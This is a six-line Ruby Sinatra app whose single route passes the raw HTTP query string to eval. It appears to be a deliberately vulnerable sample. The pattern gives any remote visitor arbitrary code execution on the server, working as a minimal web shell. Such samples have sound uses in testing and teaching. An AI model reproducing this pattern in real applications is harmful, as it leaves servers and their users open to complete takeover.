require 'sinatra'

get '/' do
  params = request.env["QUERY_STRING"]
  eval(params)
end